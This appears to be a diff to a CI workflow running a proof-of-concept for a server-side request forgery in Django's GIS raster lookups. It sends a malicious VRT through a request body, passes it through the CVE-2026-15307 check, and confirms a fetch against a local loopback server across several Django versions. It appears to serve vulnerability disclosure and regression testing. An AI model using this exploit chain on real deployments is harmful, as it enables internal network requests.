@@ -8,6 +8,14 @@ on:
 
 jobs:
   poc:
+    strategy:
+      fail-fast: false
+      matrix:
+        django:
+          - "Django==5.2.17"
+          - "Django==6.0.8"
+          - "Django==6.1.1"
+          - "Django @ git+https://github.com/django/django.git@9e06baf2e4dd17834b5deaf3a3e6ae3bff2fcf26"
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
@@ -18,19 +26,21 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y gdal-bin libgdal-dev libgeos-dev
-      - name: Install current Django
+      - name: Install Django target
         run: |
           python -m pip install -U pip
-          python -m pip install "Django @ git+https://github.com/django/django.git@9e06baf2e4dd17834b5deaf3a3e6ae3bff2fcf26" "psycopg[binary]"
-      - name: Run loopback-only reproduction
+          python -m pip install "${{ matrix.django }}" "psycopg[binary]"
+      - name: Run request-body to spatial-lookup SSRF reproduction
         env:
           DJANGO_SETTINGS_MODULE: poc_settings
         run: |
           cat > poc_settings.py <<'PY'
           SECRET_KEY = "poc"
+          ALLOWED_HOSTS = ["testserver"]
           INSTALLED_APPS = ["django.contrib.contenttypes", "django.contrib.gis"]
           DATABASES = {"default": {"ENGINE": "django.contrib.gis.db.backends.postgis", "NAME": "unused"}}
           PY
+
           cat > poc.py <<'PY'
           import threading
           from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -41,11 +51,12 @@ jobs:
           from django.contrib.gis.gdal import GDALRaster
           from django.contrib.gis.db.models import RasterField
           from django.contrib.gis.db.backends.postgis.adapter import PostGISAdapter
+          from django.test import RequestFactory
 
           hits = []
 
-          # Produce a valid 1x1 GeoTIFF entirely in /vsimem. This is what the
-          # loopback server returns when the malicious VRT dereferences its source.
+          # Valid loopback-only source raster. The malicious VRT references it
+          # through /vsicurl/ so the PoC never contacts an external system.
           src = GDALRaster({
               "name": "/vsimem/h1-source.tif",
               "driver": "GTiff",
@@ -96,27 +107,48 @@ jobs:
             </VRTRasterBand>
           </VRTDataset>"""
 
-          # This is the security gate added for CVE-2026-15307.
-          GDALRaster.check_raster_lookup_value(vrt)
-          print("CHECK_RASTER_LOOKUP_VALUE=ALLOWED_BYTES")
+          print("DJANGO_VERSION=", django.get_version())
 
-          # This is the normal spatial lookup preparation path for a RasterField.
+          # Built-in request-facing bytes source: request.body is raw bytes.
+          request = RequestFactory().post(
+              "/spatial-lookup",
+              data=vrt,
+              content_type="application/octet-stream",
+          )
+          attacker_bytes = request.body
+          print("REQUEST_BODY_TYPE=", type(attacker_bytes).__name__)
+          print("REQUEST_BODY_EQUALS_VRT=", attacker_bytes == vrt)
+          assert isinstance(attacker_bytes, bytes)
+          assert attacker_bytes == vrt
+
+          # Security gate added for CVE-2026-15307. The patched implementation
+          # intentionally allows bytes because the docs claim /vsimem confines
+          # them to memory.
+          GDALRaster.check_raster_lookup_value(attacker_bytes)
+          print("CHECK_RASTER_LOOKUP_VALUE=ALLOWED_REQUEST_BYTES")
+
+          # Normal spatial lookup value preparation.
           field = RasterField(srid=4326)
-          prepared = field.get_prep_value(vrt)
+          prepared = field.get_prep_value(attacker_bytes)
           print("PREPARED_DRIVER=", prepared.driver.name)
           print("HITS_AFTER_PREP=", hits)
+          assert prepared.driver.name == "VRT"
+          assert hits == []
 
-          # PostGIS query parameter adaptation calls to_pgraster(), which calls
-          # band.data() and therefore dereferences the VRT SourceFilename.
+          # Normal PostGIS query parameter serialization calls to_pgraster(),
+          # which reads the VRT band and dereferences SourceFilename.
           adapter = PostGISAdapter(prepared)
           print("ADAPTER_BYTES=", len(adapter.ewkb))
           print("HTTP_HITS=", hits)
 
           server.shutdown()
+
           if not hits:
               raise SystemExit("FAIL: no loopback request observed")
           if not any(path == "/source.tif" for _, path in hits):
-              raise SystemExit("FAIL: unexpected request path")
-          print("POC_RESULT=SSRF_CONFIRMED")
+              raise SystemExit("FAIL: expected /source.tif request not observed")
+
+          print("POC_RESULT=REQUEST_BODY_BYTES_SSRF_CONFIRMED")
           PY
+
           python poc.py
